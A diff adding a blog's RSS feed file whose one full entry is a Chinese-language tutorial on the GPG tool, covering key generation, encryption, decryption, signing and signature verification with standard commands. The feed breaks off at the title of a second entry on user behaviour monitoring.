@@ -1,0 +1,2055 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>网络安全 on Luna_Blog</title>
+        <link>https://lunaasuka.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link>
+        <description>Recent content in 网络安全 on Luna_Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <lastBuildDate>Fri, 24 Sep 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://lunaasuka.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>GPG工具介绍</title>
+        <link>https://lunaasuka.github.io/p/gpg%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/</link>
+        <pubDate>Fri, 24 Sep 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://lunaasuka.github.io/p/gpg%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/</guid>
+        <description>&lt;h2 id=&#34;一什么是gpg&#34;&gt;一.什么是GPG&lt;/h2&gt;
+&lt;p&gt;​		1991 年，程序员 Phil Zimmermann 为了避开政府监视，开发了加密软件 PGP。这个软件非常好用，迅速流传开来，成了许多程序员的必备工具。但是，它是商业软件，不能自由使用。所以，自由软件基金会决定，开发一个 PGP 的替代品，取名为 GnuPG。这就是 GPG 的由来。&lt;/p&gt;
+&lt;h2 id=&#34;二使用&#34;&gt;二.使用&lt;/h2&gt;
+&lt;p&gt;先放一个官方说明。&lt;/p&gt;
+&lt;p&gt;（Linux kali 5.2.0-kali2-amd64 #1 SMP Debian 5.2.9-2kali1 (2019-08-22) x86_64 GNU/Linux 这是我使用的kali版本）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;84
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gpg &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GnuPG&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 2.2.17
+libgcrypt 1.8.4
+Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;C&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; or later &amp;lt;https://gnu.org/licenses/gpl.html&amp;gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+Home: /root/.gnupg
+支持的算法：
+公钥： RSA, ELG, DSA, ECDH, ECDSA, EDDSA
+密文： IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
+    CAMELLIA128, CAMELLIA192, CAMELLIA256
+散列： SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224
+压缩：  不压缩, ZIP, ZLIB, BZIP2
+
+语法：gpg &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;options&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;files&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+签名、检查、加密或解密
+默认的操作依输入数据而定
+
+命令：
+ 
+ -s, --sign                  生成一份签名
+     --clear-sign            生成一份明文签名
+ -b, --detach-sign           生成一份分离的签名
+ -e, --encrypt               加密数据
+ -c, --symmetric             仅使用对称密文加密
+ -d, --decrypt               解密数据（默认）
+     --verify                验证签名
+ -k, --list-keys             列出密钥
+     --list-signatures       列出密钥和签名
+     --check-signatures      列出并检查密钥签名
+     --fingerprint           列出密钥和指纹
+ -K, --list-secret-keys      列出私钥
+     --generate-key          生成一个新的密钥对
+     --quick-generate-key    快速生成一个新的密钥对
+     --quick-add-uid         快速添加一个新的用户标识
+     --quick-revoke-uid      快速吊销一个用户标识
+     --quick-set-expire      快速设置一个过期日期
+     --full-generate-key     完整功能的密钥对生成
+     --generate-revocation   生成一份吊销证书
+     --delete-keys           从公钥钥匙环里删除密钥
+     --delete-secret-keys    从私钥钥匙环里删除密钥
+     --quick-sign-key        快速签名一个密钥
+     --quick-lsign-key       快速本地签名一个密钥
+     --sign-key              签名一个密钥
+     --lsign-key             本地签名一个密钥
+     --edit-key              签名或编辑一个密钥
+     --change-passphrase     更改密码
+     --export                导出密钥
+     --send-keys             个密钥导出到一个公钥服务器上
+     --receive-keys          从公钥服务器上导入密钥
+     --search-keys           在公钥服务器上搜索密钥
+     --refresh-keys          从公钥服务器更新所有密钥
+     --import                导入/合并密钥
+     --card-status           打印卡片状态
+     --edit-card             更改卡片上的数据
+     --change-pin            更改卡片的 PIN
+     --update-trustdb        更新信任数据库
+     --print-md              打印消息摘要
+     --server                以服务器模式运行
+     --tofu-policy VALUE     设置一个密钥的 TOFU 政策
+
+选项：
+ 
+ -a, --armor                 创建 ASCII 字符封装的输出
+ -r, --recipient USER-ID     为 USER-ID 加密
+ -u, --local-user USER-ID    使用 USER-ID 来签名或者解密
+ -z N                        设置压缩等级为 N （0 为禁用）
+     --textmode              使用规范的文本模式
+ -o, --output FILE           写输出到 FILE
+ -v, --verbose               详细模式
+ -n, --dry-run               不做任何更改
+ -i, --interactive           覆盖前提示
+     --openpgp               使用严格的 OpenPGP 行为
+
+（请参考手册页以获得所有命令和选项的完整列表）
+
+例子：
+
+ -se -r Bob &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;file&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;          为用户 Bob 签名和加密
+ --clear-sign &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;file&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;        创建一个明文签名
+ --detach-sign &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;file&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;       创建一个分离签名
+ --list-keys &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;names&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;        列出密钥
+ --fingerprint &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;names&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;      显示指纹
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可以看到工具本身支持的功能很多，我们这里就简单介绍加解密的内容。&lt;/p&gt;
+&lt;p&gt;可以使用 gpg &amp;ndash;gen-key 来生成密钥。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gpg --gen-key 
+注意：使用 “gpg --full-generate-key” 以获得一个功能完整的密钥产生对话框。
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;使用该命令即可生成密钥，但是运行该命令部分选项将会默认选择，如想要使用的加密方式（默认RSA）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;请选择您要使用的密钥类型：
+   &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; RSA 和 RSA （默认）
+   &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; DSA 和 Elgamal
+   &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; DSA（仅用于签名）
+   &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; RSA（仅用于签名）
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;想要使用的密钥长度，密钥越长越安全&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;RSA 密钥的长度应在 &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; 位与 &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; 位之间。
+您想要使用的密钥长度？&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3072&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;以及密钥的有效期限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;请设定这个密钥的有效期限。
+         &lt;span class=&#34;nv&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 密钥永不过期
+      &amp;lt;n&amp;gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 密钥在 n 天后过期
+      &amp;lt;n&amp;gt;w &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 密钥在 n 周后过期
+      &amp;lt;n&amp;gt;m &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 密钥在 n 月后过期
+      &amp;lt;n&amp;gt;y &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 密钥在 n 年后过期
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这些都选择完成之后会要求你提供个人信息。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;真实姓名： ** ******
+电子邮件地址： 2838419909@qq.com
+您选定了此用户标识：
+    “** ****** &amp;lt;2838419909@qq.com&amp;gt;”
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这些信息是方便其他人辨识你的，填写什么是随意的，当然如果填写一些伪造的信息也没人管（笑&lt;/p&gt;
+&lt;p&gt;一切都确认好之后，系统会让你设定一个私钥的密码，这是出于安全考虑，可以更有效的保护你的私钥。&lt;/p&gt;
+&lt;p&gt;然后系统就会开始生成密钥，这时可以做一些随机的举动，例如敲打键盘或者移动鼠标之类的。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;我们需要生成大量的随机字节。在质数生成期间做些其他操作（敲打键盘、移动鼠标、读写硬盘之类的）将会是一个不错的主意，这会让随机数发生器有更好的机会获得足够的熵。
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;要不了多久密钥就生成好了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gpg: 密钥 7E63E27A7D6D5059 被标记为绝对信任
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里的 7E63E27A7D6D5059 是 用户ID 的Hash字符串，可以用来替代 用户ID 。&lt;/p&gt;
+&lt;h3 id=&#34;加密&#34;&gt;加密&lt;/h3&gt;
+&lt;p&gt;我们可以使用 encrypt 参数来加密文件，假设这里有一个 test.txt 需要被加密。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gpg --recipient &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;用户ID&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; --output en_test.txt --encrypt test.txt&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;recipient 参数用来指定接受者的公钥， output 用来指定输出的文件名， encrypt 用来指定需要加密的文件。&lt;/p&gt;
+&lt;h3 id=&#34;解密&#34;&gt;解密&lt;/h3&gt;
+&lt;p&gt;对方收到加密文件以后，就可以用自己的私钥解密。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gpg --decrypt en_test.txt --output de_test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;decrypt 参数用来指定需要被解密的文件。&lt;/p&gt;
+&lt;p&gt;ps：gpg允许省略 decrypt 参数，也就是说你甚至可以简写成&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gpg en_test.txt 
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;​		现在让我们来明确下加密和解密的流程。设有两人 A 和 B 。A 现在想给 B 发送一个加密的文件。那么首先 A 要拿到 B 的公钥，可以是在公钥服务器上下载或者由 B 直接发给 A ，然后用这个公钥来对文件加密，即加密时的 recipient 参数所指定的接受者的公钥，在这里就是我们已经获取的 B 的公钥。之后将加密过的文件发给 B ，B 拿到后使用自己的私钥对其进行解密，即可还原文件。也就是说，如果想给一个人发送一个对方能解密的文件，那么就需要先拿到对方的公钥才能进行加密。&lt;/p&gt;
+&lt;h3 id=&#34;签名&#34;&gt;签名&lt;/h3&gt;
+&lt;p&gt;对文件签名就是为了让别人知道这个文件是由我发出的或者是由我编写的。&lt;/p&gt;
+&lt;p&gt;我们可以使用 sign 参数来签名。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gpg --sign test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;运行后将会生成 test.txt.gpg 文件，这就是签名后的文件，这个文件默认使用二进制储存，也可以使用 clearsign 参数来生成 ASCII 码的签名文件。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gpg --clearsign test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;如果想单独生成一个签名文件，可以使用 detach-sign 参数。需要采用 ASCII 格式的就添加 armor 参数结课。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gpg --detach-sign test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;验证签名&#34;&gt;验证签名&lt;/h3&gt;
+&lt;p&gt;要记住，想要验证签名也需要对方的公钥才行，使用 verify 参数来验证。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gpg --verify test.txt.gpg test.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;前者是需要验证签名的文件，后者是输出文件。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>用户行为监控</title>
+        <link>https://lunaasuka.github.io/p/%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E7%9B%91%E6%8E%A7/</link>
